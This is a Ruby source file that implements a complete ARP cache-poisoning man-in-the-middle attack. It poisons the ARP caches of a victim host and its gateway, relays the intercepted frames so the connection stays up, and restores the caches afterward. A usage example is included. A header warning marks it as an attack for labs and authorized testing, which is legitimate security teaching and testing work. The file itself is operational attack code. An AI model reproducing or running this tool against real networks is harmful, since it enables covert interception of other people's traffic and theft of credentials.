# frozen_string_literal: true

require "datalink/spoof"
require "datalink/arp"
require "datalink/arp/resolver"

module Datalink
  module Attack
    # A bidirectional ARP cache-poisoning man-in-the-middle.
    #
    # It makes the victim believe the gateway is at the attacker's MAC,
    # and the gateway believe the victim is at the attacker's MAC. Both
    # sides then send their traffic to the attacker. With forwarding on,
    # the attacker relays it so the connection keeps working while it is
    # observed (that is what makes it a MITM rather than a denial of
    # service).
    #
    # ==================================================================
    #  THIS IS AN ATTACK. Running it intercepts other people's traffic.
    #  Doing that on a network you do not own or are not explicitly
    #  authorized to test is a crime in most countries. This exists for
    #  teaching, for your own lab, and for sanctioned security testing.
    #  Only run it where you have permission in writing.
    # ==================================================================
    #
    # Usage:
    #   atk = Datalink::Attack::ArpPoison.new(
    #     socket,
    #     attacker_mac: my_mac,
    #     attacker_ip:  my_ip,
    #     victim_ip:    "192.168.1.50",
    #     gateway_ip:   "192.168.1.1",
    #     forward: true)
    #   atk.run(duration: 60)     # poisons, forwards, then restores
    #
    # The attacker's IP is only used to send the ARP resolution requests
    # that discover the victim's and gateway's real MACs.
    class ArpPoison
      attr_reader :victim_mac, :gateway_mac

      def initialize(socket, attacker_mac:, attacker_ip:, victim_ip:, gateway_ip:,
                     forward: true, interval: 2, logger: nil)
        @socket = socket
        @attacker_mac = attacker_mac.is_a?(MAC) ? attacker_mac : MAC.new(attacker_mac)
        @attacker_ip = attacker_ip
        @victim_ip = IPAddr.new(victim_ip.to_s)
        @gateway_ip = IPAddr.new(gateway_ip.to_s)
        @forward = forward
        @interval = interval
        @logger = logger
        @spoof = Spoof.new(@socket, attacker_mac: @attacker_mac)
        @running = false
      end

      # Resolve both targets' real MACs (needed to poison them and to
      # restore them later). Call before #run, or let #run call it.
      def discover(timeout: 3)
        resolver = ARP::Resolver.new(@socket, sender_mac: @attacker_mac, sender_ip: @attacker_ip)
        log "resolving victim #{@victim_ip} ..."
        @victim_mac = resolver.resolve(@victim_ip, timeout: timeout)
        raise Error, "could not resolve victim #{@victim_ip}" unless @victim_mac

        log "resolving gateway #{@gateway_ip} ..."
        @gateway_mac = resolver.resolve(@gateway_ip, timeout: timeout)
        raise Error, "could not resolve gateway #{@gateway_ip}" unless @gateway_mac

        log "victim #{@victim_ip} is at #{@victim_mac}; gateway #{@gateway_ip} is at #{@gateway_mac}"
        [@victim_mac, @gateway_mac]
      end

      # Poison both caches, optionally forward intercepted frames, and run
      # for +duration+ seconds (or until #stop, or forever if nil).
      # Always restores the caches on the way out.
      def run(duration: nil)
        discover if @victim_mac.nil? || @gateway_mac.nil?
        @running = true
        deadline = duration && (monotonic + duration)

        poisoner = Thread.new { poison_until_stopped }
        forwarder = (@forward ? Thread.new { forward_until_stopped } : nil)

        log "MITM active. #{@forward ? 'forwarding on' : 'forwarding OFF (this cuts the victim off)'}"
        begin
          sleep_until(deadline)
        ensure
          stop
          poisoner.join
          forwarder&.join
          restore
        end
      end

      def stop
        @running = false
      end

      def running?
        @running
      end

      # Heal both caches by broadcasting the correct mappings.
      def restore
        return unless @victim_mac && @gateway_mac

        log "restoring caches ..."
        # Tell the victim the gateway's real MAC, and vice versa.
        @spoof.poison(victim_ip: @victim_ip, victim_mac: @victim_mac,
                      spoofed_ip: @gateway_ip, as_mac: @gateway_mac)
        @spoof.poison(victim_ip: @gateway_ip, victim_mac: @gateway_mac,
                      spoofed_ip: @victim_ip, as_mac: @victim_mac)
        @spoof.restore(ip: @gateway_ip, mac: @gateway_mac)
        @spoof.restore(ip: @victim_ip, mac: @victim_mac)
      end

      private

      def poison_until_stopped
        while @running
          # Victim thinks gateway_ip -> attacker_mac.
          @spoof.poison(victim_ip: @victim_ip, victim_mac: @victim_mac, spoofed_ip: @gateway_ip)
          # Gateway thinks victim_ip -> attacker_mac.
          @spoof.poison(victim_ip: @gateway_ip, victim_mac: @gateway_mac, spoofed_ip: @victim_ip)
          sleep(@interval)
        end
      end

      # Relay frames that arrive for us but are really between victim and
      # gateway, rewriting the destination MAC to the true owner so the
      # conversation keeps flowing through us.
      def forward_until_stopped
        @socket.recv_timeout = 0.5
        while @running
          begin
            captured = @socket.recv
          rescue TimeoutError
            next
          end
          relay(captured.frame)
        end
      end

      def relay(frame)
        # Only forward frames addressed to our MAC at L2 (the poisoned
        # ones) that came from one of our two targets.
        return unless frame.dst == @attacker_mac

        if frame.src == @victim_mac
          send_to(frame, @gateway_mac)
        elsif frame.src == @gateway_mac
          send_to(frame, @victim_mac)
        end
      end

      def send_to(frame, new_dst)
        frame.dst = new_dst
        frame.src = @attacker_mac
        @socket.send(frame)
      end

      def sleep_until(deadline)
        loop do
          break unless @running
          break if deadline && monotonic >= deadline

          sleep(0.2)
        end
      end

      def monotonic
        Process.clock_gettime(Process::CLOCK_MONOTONIC)
      end

      def log(msg)
        return unless @logger

        @logger.respond_to?(:info) ? @logger.info(msg) : @logger.puts(msg)
      end
    end
  end
end
